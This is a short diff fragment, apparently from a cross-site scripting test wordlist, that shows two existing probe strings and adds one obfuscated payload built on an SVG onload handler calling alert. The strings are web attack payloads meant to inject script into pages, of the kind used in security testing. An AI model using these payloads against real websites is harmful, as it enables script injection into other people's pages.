@@ -11,3 +11,5 @@
 '';!--"<XSS>=&{()}
 
 <!--><script>alert/**/()/**/</script>
+
+`/alert?.(1)'"><Svg/OnLoad='`
